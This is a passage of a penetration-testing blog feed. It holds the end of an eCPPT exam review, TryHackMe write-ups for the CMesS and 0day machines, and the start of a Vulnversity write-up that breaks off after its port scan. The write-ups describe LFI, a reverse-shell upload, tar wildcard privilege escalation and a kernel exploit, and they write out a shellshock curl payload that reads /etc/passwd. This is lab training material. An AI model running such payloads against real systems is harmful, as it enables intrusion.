  &lt;li&gt;Understanding a letter of engagement and the basics related to a penetration testing engagement&lt;/li&gt;
  &lt;li&gt;Deep understanding of networking concepts&lt;/li&gt;
  &lt;li&gt;Manual exploitation of Windows and Linux targets&lt;/li&gt;
  &lt;li&gt;Performing vulnerability assessment of networks&lt;/li&gt;
  &lt;li&gt;Using Metasploit for complex and multi-step exploitation of different systems and OS’s&lt;/li&gt;
  &lt;li&gt;Web application Manual exploitation&lt;/li&gt;
  &lt;li&gt;Ability in performing post-exploitation techniques&lt;/li&gt;
  &lt;li&gt;Exploit development skills on x86 environment&lt;/li&gt;
  &lt;li&gt;Outstanding reporting skills&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;eLearnSecurity states the following&lt;/p&gt;

&lt;p&gt;By obtaining the eCPPT, your skills in the following areas will be assessed and certified:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Penetration testing processes and methodologies, against Windows and Linux targets&lt;/li&gt;
  &lt;li&gt;Vulnerability Assessment of Networks&lt;/li&gt;
  &lt;li&gt;Vulnerability Assessment of Web Applications&lt;/li&gt;
  &lt;li&gt;Advanced Exploitation with Metasploit&lt;/li&gt;
  &lt;li&gt;Performing Attacks in Pivoting&lt;/li&gt;
  &lt;li&gt;Web application Manual exploitation&lt;/li&gt;
  &lt;li&gt;Information Gathering and Reconnaissance&lt;/li&gt;
  &lt;li&gt;Scanning and Profiling the target&lt;/li&gt;
  &lt;li&gt;Privilege escalation and Persistence&lt;/li&gt;
  &lt;li&gt;Exploit Development&lt;/li&gt;
  &lt;li&gt;Advanced Reporting skills and Remediation&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I can 100% guarantee that everything eLearnSecurity states is true and you will be assessed in those areas.&lt;/p&gt;

&lt;h2 id=&quot;preparation&quot;&gt;Preparation&lt;/h2&gt;

&lt;p&gt;I can’t really tell somebody how to best prepare for this exam. I’ve got some “experience” in pentesting from a ton of tryhackme, hackthebox and other ctfs and the exam didn’t feel extremely hard (at least for me)&lt;/p&gt;

&lt;p&gt;On the practical side I’ve done:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;INE’s PTP aka Penetration Testing Professional course (including labs)&lt;/li&gt;
  &lt;li&gt;TCM’s PEH course&lt;/li&gt;
  &lt;li&gt;250 TryHackMe rooms&lt;/li&gt;
  &lt;li&gt;60 HackTheBox machines (including live and retired ones)&lt;/li&gt;
  &lt;li&gt;20-25 Offensive Security’s Proving Grounds machines&lt;/li&gt;
  &lt;li&gt;Participated in a ton of CTFs competitions&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I’ve also watched a ton of ippsec’s videos, read walkthroughs of different machines and took good notes.&lt;/p&gt;

&lt;h2 id=&quot;exam-day&quot;&gt;Exam day&lt;/h2&gt;

&lt;p&gt;There’s nothing much to talk here. My exam was.. short I’d say. I’ve compromised every single host in about 26 hours (including the report as well)&lt;/p&gt;

&lt;p&gt;The exam covers what you’ve learned during the course material. Having done all the labs while supposedly you took good notes along the way, the exam shouldn’t difficult at all. Of course it may throw you off in some circumstances but that’s up to you and how you can think in critical moments.&lt;/p&gt;

&lt;p&gt;Pro Tip: Use already compromised hosts in your advantage :)&lt;/p&gt;

&lt;h2 id=&quot;result&quot;&gt;Result&lt;/h2&gt;

&lt;p&gt;I really enjoyed the course material and the exam. If you want a solid foundation of penetration testing first, go for eJPT, since the exam cannot even be compared to eCPPT’s exam environment, for that matter, eJPT is more approachable. If you want to learn how real pentests are done and advance in your pentesting skills, take INE’s PTP course and attempt the exam, as it will benefit you the most in your career as a pentester.&lt;/p&gt;

&lt;p&gt;I’ve got my eCPPT results back extremely fast. I know it may take longer for some people but it was super quick for me :)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Nov 30 2021 01:31:34 - Exam Started&lt;/li&gt;
  &lt;li&gt;Dec 1 2021 05:39:00 - Report submitted&lt;/li&gt;
  &lt;li&gt;Dec 1 2021 20:45:45 Report Assessed&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/reviews/ecppt/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The result?&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/reviews/ecppt/cert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Link: https://verified.elearnsecurity.com/certificates/86ebfe40-74a4-4caa-a84b-d4ada08c04e9&lt;/p&gt;

&lt;p&gt;I know people make these reviews maybe a bit longer and go in much more detail, but I just wanted to give my input and whether you liked it or not, thanks for reading.&lt;/p&gt;</content><author><name>Miaulez</name><email>root@miaulez.rocks</email></author><category term="infosec" /><category term="INE" /><category term="elearnsecurity" /><category term="pentesting" /><category term="review" /><category term="exam" /><category term="ecppt" /><summary type="html">A review of the eLearnSecurity's eCPPT exam and certification.</summary></entry><entry><title type="html">CMesS - Try Hack Me</title><link href="http://localhost:4000/thm-cmess-writeup/" rel="alternate" type="text/html" title="CMesS - Try Hack Me" /><published>2022-01-04T00:00:00-05:00</published><updated>2022-01-04T00:00:00-05:00</updated><id>http://localhost:4000/thm-cmess-writeup</id><content type="html" xml:base="http://localhost:4000/thm-cmess-writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Heyo, today we’re doing Cmess from tryhackme, a medium-rated box that involved finding a local file inclusion, looking at a configuration file to find a subdomain, getting a password for a user that we can log into an admin panel with. For remote code execution we’re abusing an upload form and we modify a .htaccess file. On the box there’s a backup password hidden in /opt that gets us a low-priv user shell on the box. For privilege escalation we’re abusing a cronjob tar wildcard within a folder where we have write permission.&lt;/p&gt;

&lt;h2 id=&quot;nmap&quot;&gt;Nmap&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Wed Sep 22 10:46:04 2021 as: nmap -sC -sV -oN nmap/cmess -p- 10.10.211.176&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.211.176
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.027s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep 22 10:46:31 2021 -- 1 IP address (1 host up) scanned in 27.76 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Before going to the webserver, there’s one thing we’re required to do.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;webserver&quot;&gt;WebServer&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing appears out of the order at the first sight, but we do have a copyright that’s from 2017, as well as the name of the possible CMS that the website is running on “Gila CMS”. First things first, searchsploit it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4 results. Because the copyright on the website says 2017, I’ll go with the last one “Gila CMS &amp;lt; 1.11.1 - Local File Inclusion”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Authenticated, since we haven’t got any type of access we’re not going to dig into it. I went googling in hope that I’ll find something, and I did.&lt;/p&gt;

&lt;p&gt;Post: https://infosecdb.wordpress.com/2020/01/05/gilacms-1-11-8-cm-deletet-lfi-local-file-inclusion-and-rce/&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It says “Authentication: Required” , but let’s go for it anyway.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hmm, let’s try the base root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hey look at that, local file inclusion. Now what can we do with it? I’ve tried php filters, and quite some ways to obtain remote code execution off of it. Nothing, but a thing I always check when i see a local file inclusion on a webserver that runs apache is “/etc/apache2/sites-available/000-default.conf”, if there’s any virutal host in place, this file will give us quite valuable information, let’s try that.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looks like we’ve got something, dev.cmess.thm. Let’s add that to our hosts file and see what’s there.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I’ve tried logging into the box via ssh with it but it didn’t work. So let’s try it on the admin panel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we get in. We can also see the version of Gila that’s running on. Now our main goal here is to obtain rce. After 2 minutes of googling I’ve stumbled across a post on github.&lt;/p&gt;

&lt;p&gt;Post: https://github.com/jkana/Gila-CMS-1.16.0-shell-upload&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Instead of going 1:1 with that post, I’ll do it my way.&lt;/p&gt;

&lt;p&gt;First, one directory up.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we create a file called whateveryouwant.php (you can literally call it however you want, just make sure it has .php at the end)&lt;/p&gt;

&lt;p&gt;In it we put a reverse shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I’ve already updated the ip and port. After the file has been created, we’re going to overwrite the .htaccess by making a new .htaccess&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, the second after we press “Ok” it’ll say Not Found.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, just go to the base root and type your shell’s name. Let’s start a listener first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let’s activate the shell by going to the base root + filename.php&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I got the shell and I’ve stabilized it. After just 20 seconds of poking around I’ve found a hidden file called .password.bak in /opt directory&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;user&quot;&gt;User&lt;/h2&gt;

&lt;p&gt;Let’s try to log in via ssh.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After checking some basic things I checked /etc/crontab&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For me, this looks like an easy privesc, since we have write permission in our own home folder, we can abuse the wildcard (*) to get a reverse shell as root on the box, let’s see that in action. :)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we’re waiting for the connection to be made :D&lt;/p&gt;

&lt;h2 id=&quot;rooted&quot;&gt;Rooted&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/cmess/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That was it, a fun medium-rated box from tryhackme, hope you enjoyed, thanks for reading.&lt;/p&gt;</content><author><name>Miaulez</name><email>root@miaulez.rocks</email></author><category term="tryhackme" /><category term="infosec" /><category term="tar" /><category term="gila cms" /><category term="enumeration" /><category term="lfi" /><category term="security" /><category term="pentesting" /><category term="CVE-2020-5513" /><summary type="html">Can you root this Gila CMS box?</summary></entry><entry><title type="html">0day - Try Hack Me</title><link href="http://localhost:4000/thm-0day-writeup/" rel="alternate" type="text/html" title="0day - Try Hack Me" /><published>2022-01-03T00:00:00-05:00</published><updated>2022-01-03T00:00:00-05:00</updated><id>http://localhost:4000/thm-0day-writeup</id><content type="html" xml:base="http://localhost:4000/thm-0day-writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hello, and welcome to the write-up for 0day machine on TryHackMe, a medium-rated machine that involved exploiting a shellshock vulnerability, then escalating to root via a kernel exploit.&lt;/p&gt;

&lt;h1 id=&quot;nmap&quot;&gt;Nmap&lt;/h1&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Mon Sep 13 06:24:27 2021 as: nmap -sC -sV -oN nmap/0day 10.10.115.124&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.115.124
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.027s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.7 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: 0day
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Mon Sep 13 06:24:42 2021 -- 1 IP address (1 host up) scanned in 15.35 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nothing that stands up, just that the openssh is a bit outdated, but it does not have any public exploits available to aid us into gaining access to the machine&lt;/p&gt;

&lt;h1 id=&quot;webserver&quot;&gt;WebServer&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing, let’s check the source code&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nothing as well, let’s dive into directory busting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Gobuster quickly found some interesting directories to have look into, let’s check each one of these&lt;/p&gt;

&lt;p&gt;going to /uploads we discover a blank page (but we might gobuster it)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;let’s try /admin&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And again, a blank page.&lt;/p&gt;

&lt;p&gt;peeking at /backup&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This looks like a private id_rsa key, it is encrypted though, let’s try cracking it&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The password is “letmein” , let’s try the username of 0day (as we saw on the front page)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Unfortunately, it didn’t work. Let’s take a step back and revisit the last directory gobuster had found, which is /secret&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And.. nothing, just a photo of a turtle&lt;/p&gt;

&lt;p&gt;But wait, there’s one more, and that is /cgi-bin, now, let me explain what /cgi-bin directory is. The cgi-bin is a folder for scripts found in the directories of the file manager. If we googled something like “cgi-bin vulnerabilities”, we’ll most likely stumble across a well-known vulnerability called “shellshock”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, what is shellshock? Shellshock is effectively a Remote Command Execution vulnerability in bash. The vulnerability relies in the fact that bash incorrectly executes trailing commands when it imports a function definition stored into an environment variable (source: https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf)&lt;/p&gt;

&lt;h1 id=&quot;understanding-the-vulnerability&quot;&gt;Understanding the vulnerability&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Googling “shellshock exploit”, quickly gives us a github page, that explains what shellshock is, and also provides an exploit for it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, having done our enumeration thoroughly and having nikto run in the background while checking the directories and all that stuff, nikto will actually tell us that there is a shellshock vulnerability on the website, let’s take a look&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;                                                                                                                 1 ⨯
http://10.10.115.124/cgi-bin/test.cgi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We’ll use this payload&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And there we go, let’s get a shell on the box.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Great, let’s stabilize the shell&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s get the user.txt flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Quickly after running linpeas we can see that the kernel in use might be our PE vector&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s google that up&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Viewing the post from exploit-db&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s copy and compile this exploit onto the target machine&lt;/p&gt;

&lt;p&gt;However, when we try to compile the exploit, an error shows up&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s search for cc1 using find to see if cc1 is present on the system (maybe it isn’t in our path but it could be on the box)&lt;/p&gt;

&lt;h1 id=&quot;rooted&quot;&gt;Rooted&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/thm/0day/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Well, simple as that we rooted this box. It was definitely not a tough machine, and you can learn that even tools like nikto can get you where you want to be. Hope you enjoyed reading this write-up.&lt;/p&gt;</content><author><name>Miaulez</name><email>root@miaulez.rocks</email></author><category term="tryhackme" /><category term="infosec" /><category term="overlayfs" /><category term="shellshock" /><category term="kernel exploit" /><category term="tryhackme" /><category term="security" /><category term="pentesting" /><category term="CVE-2014-6271" /><summary type="html">0day invloves exploiting a shellshock vulnerability for an initial foothold, then escalating to root via a kernel exploit.</summary></entry><entry><title type="html">Vulnversity - Try Hack Me</title><link href="http://localhost:4000/thm-vulnversity-writeup/" rel="alternate" type="text/html" title="Vulnversity - Try Hack Me" /><published>2022-01-03T00:00:00-05:00</published><updated>2022-01-03T00:00:00-05:00</updated><id>http://localhost:4000/thm-vulnversity-writeup</id><content type="html" xml:base="http://localhost:4000/thm-vulnversity-writeup/">&lt;p&gt;&lt;img src=&quot;/assets/images/thm/vulnversity/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hello, today we’re doing Vulnversity from tryhackme.com , an easy machine aimed for beginners. It involved finding an upload form, then exploiting that poorly secured upload form to obtain a shell on the box. For privilege escalation we found out that there is a suid bit set on systemctl , checking gtfobins gives us a method on how to run commands as root.&lt;/p&gt;

&lt;h1 id=&quot;nmap&quot;&gt;Nmap&lt;/h1&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Nmap 7.91 scan initiated Mon Sep 13 22:32:58 2021 as: nmap -sC -sV -oN nmap/vulnversity 10.10.209.201&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.209.201
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.026s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
| http-vulners-regex: 
|   /main.pl: 
|_    cpe:/a:squid-cache:squid:3.5.12
3333/tcp open  http        Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Vuln University
